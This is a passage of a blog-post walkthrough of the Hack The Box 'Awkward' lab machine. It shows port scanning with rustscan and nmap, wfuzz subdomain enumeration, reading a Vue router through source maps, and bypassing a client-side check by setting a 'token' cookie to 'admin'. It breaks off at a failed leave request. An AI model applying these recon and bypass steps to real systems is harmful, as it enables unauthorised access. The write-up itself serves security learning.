<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box Walkthrough - Awkward" />
<meta property="og:locale" content="en" />
<meta name="description" content="This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get root." />
<meta property="og:description" content="This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get root." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Walkthrough-Awkward/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Walkthrough-Awkward/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/Awkward/Awk.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-02-25T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/Awkward/Awk.png" />
<meta property="twitter:title" content="Hack The Box Walkthrough - Awkward" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-25T00:00:00+08:00","datePublished":"2023-02-25T00:00:00+08:00","description":"This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get root.","headline":"Hack The Box Walkthrough - Awkward","image":"http://localhost:4000/assets/images/Awkward/Awk.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Walkthrough-Awkward/"},"url":"http://localhost:4000/posts/HackTheBox-Walkthrough-Awkward/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box Walkthrough - Awkward | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ùêÑùê≠ùê°ùê¢ùêúùêöùê• ùêáùêöùêúùê§ùêûùê´ || ùêíùê®ùêüùê≠ùê∞ùêöùê´ùêû ùêÑùêßùê†ùê¢ùêßùêûùêûùê´ || ùêÇùê≤ùêõùêûùê´ ùêíùêûùêúùêÆùê´ùê¢ùê≠ùê≤ ùêëùêûùê¨ùêöùê´ùêúùê°ùêûùê´.!! ùêéùêíùêÇùêè & ùêéùêíùêÑùêè.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box Walkthrough - Awkward</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      
        
      
      

      
      

      

      
    
      
      
        
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box Walkthrough - Awkward</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1677254400"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Feb 25, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/Awkward/Awk.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="5941 words">
  <em>33 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get root.</p>

<ul>
  <li>Room: Awkward</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/Awkward">https://app.hackthebox.com/machines/Awkward</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/55851">coopertim13</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I started by enumerating open ports with rustscan.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-A</span>  | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ‚åõ

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.10.11.185:22
Open 10.10.11.185:80
<span class="o">[</span>~] Starting Script<span class="o">(</span>s<span class="o">)</span>
<span class="o">[&gt;]</span> Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

<span class="o">[</span>~] Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-07 19:26 EST
NSE: Loaded 155 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating Ping Scan at 19:26
Scanning 10.10.11.185 <span class="o">[</span>2 ports]
Completed Ping Scan at 19:26, 0.05s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Connect Scan at 19:26
Scanning target <span class="o">(</span>10.10.11.185<span class="o">)</span> <span class="o">[</span>2 ports]
Discovered open port 80/tcp on 10.10.11.185
Discovered open port 22/tcp on 10.10.11.185
Completed Connect Scan at 19:26, 0.02s elapsed <span class="o">(</span>2 total ports<span class="o">)</span>
Initiating Service scan at 19:26
Scanning 2 services on target <span class="o">(</span>10.10.11.185<span class="o">)</span>
Completed Service scan at 19:26, 6.08s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.11.185.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.99s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.10s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report <span class="k">for </span>target <span class="o">(</span>10.10.11.185<span class="o">)</span>
Host is up, received syn-ack <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2023-01-07 19:26:23 EST <span class="k">for </span>7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 7254afbaf6e2835941b7cd611c2f418b <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCMaN1wQtPg5uk2w3xD0d0ND6JQgzw40PoqCSBDGB7Q0/f5lQSGU2eSTw4uCdL99hdM/+Uv84ffp2tNkCXyV8l8<span class="o">=</span>
|   256 59365bba3c7821e326b37d23605aec38 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsq9sSC1uhq5CBWylh+yiC7jz4tuegMj/4FVTp6bzZy
80/tcp open  http    syn-ack nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
</span></pre></td></tr></tbody></table></code></div></div>

<p>There were two open ports, 22 (SSH) and 80 (HTTP).</p>

<p>The website was redirecting to <code class="language-plaintext highlighter-rouge">http://hat-valley.htb/</code>, I added the domain to my hosts file. I scanned the site with Feroxbuster. But it did not find anything useful.</p>

<p><img data-src="/assets/images/Awkward/HatValleySite.png" alt="Main Site" title="Main Site" data-proofer-ignore></p>

<p>I used wfuzz to look for subdomains.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/combined_subdomains.txt <span class="nt">-t30</span> <span class="nt">--hw</span> 13 <span class="nt">-H</span> <span class="s2">"Host:FUZZ.hat-valley.htb"</span> <span class="s2">"http://hat-valley.htb/"</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
 /home/ehogue/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning:urllib3 (1.26.5) or chardet (5.1.0) doesn'</span>t match a supported version!
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://hat-valley.htb/
Total requests: 648201

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload
<span class="o">=====================================================================</span>

000501986:   401        7 L      12 W       188 Ch      <span class="s2">"store"</span>

Total <span class="nb">time</span>: 0
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 0
</pre></td></tr></tbody></table></code></div></div>

<p>There was one subdomain: <code class="language-plaintext highlighter-rouge">store.hat-valley.htb</code>. I added it to my hosts file and scanned the site with Feroxbuster. It did not find anything. I tried looking at the site, but it required authentication.</p>

<h2 id="main-site"><span class="mr-2">Main Site</span><a href="#main-site" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I looked around the site. There were a few employee profiles. I noted their name in case I could use them as usernames later. There was a form on the bottom, but it did not do anything when I posted it.</p>

<p>I looked at the JavaScript code, it had the <a href="https://developer.chrome.com/blog/sourcemaps/">Source Maps</a>. I opened the Firefox Developers tools to look at it.</p>

<p><img data-src="/assets/images/Awkward/SourceCode.png" alt="Source Code" title="Source Code" data-proofer-ignore></p>

<p>I opened the router‚Äôs code and saw that the site was exposing four routes.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">routes</span> <span class="o">=</span> <span class="p">[</span>
  <span class="p">{</span>
    <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">base</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">component</span><span class="p">:</span> <span class="nx">Base</span><span class="p">,</span>
  <span class="p">},</span>
  <span class="p">{</span>
    <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/hr</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">hr</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">component</span><span class="p">:</span> <span class="nx">HR</span><span class="p">,</span>
  <span class="p">},</span>
  <span class="p">{</span>
    <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/dashboard</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">dashboard</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">component</span><span class="p">:</span> <span class="nx">Dashboard</span><span class="p">,</span>
    <span class="na">meta</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">requiresAuth</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="p">{</span>
    <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/leave</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">leave</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">component</span><span class="p">:</span> <span class="nx">Leave</span><span class="p">,</span>
    <span class="na">meta</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">requiresAuth</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">];</span>

<span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nf">createRouter</span><span class="p">({</span>
  <span class="na">history</span><span class="p">:</span> <span class="nf">createWebHistory</span><span class="p">(),</span>
  <span class="nx">routes</span><span class="p">,</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">beforeEach</span><span class="p">((</span><span class="nx">to</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nf">if</span><span class="p">((</span><span class="nx">to</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">leave</span><span class="dl">'</span> <span class="o">||</span> <span class="nx">to</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">dashboard</span><span class="dl">'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">VueCookieNext</span><span class="p">.</span><span class="nf">getCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">token</span><span class="dl">'</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">guest</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//if user not logged in, redirect to login</span>
    <span class="nf">next</span><span class="p">({</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hr</span><span class="dl">'</span> <span class="p">})</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="nf">if</span><span class="p">(</span><span class="nx">to</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">hr</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">VueCookieNext</span><span class="p">.</span><span class="nf">getCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">token</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">guest</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//if user logged in, skip past login to dashboard</span>
    <span class="nf">next</span><span class="p">({</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">dashboard</span><span class="dl">'</span> <span class="p">})</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nf">next</span><span class="p">()</span>
  <span class="p">}</span>
<span class="p">})</span>

<span class="k">export</span> <span class="k">default</span> <span class="nx">router</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">dashboard</code> and <code class="language-plaintext highlighter-rouge">leave</code> endpoints needed a <code class="language-plaintext highlighter-rouge">token</code> cookie. If it was set to anything other than ‚Äòguest‚Äô, the page would be rendered. I changed my cookie to ‚Äòadmin‚Äô and loaded the dashboard page.</p>

<p><img data-src="/assets/images/Awkward/Dashboard.png" alt="Dashboard" title="Dashboard" data-proofer-ignore></p>

<p>The page loaded. Same with the page to send leave requests.</p>

<p><img data-src="/assets/images/Awkward/LeaveRequest.png" alt="Leave Requests" title="Leave Requests" data-proofer-ignore></p>

<p>But posting a request failed.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
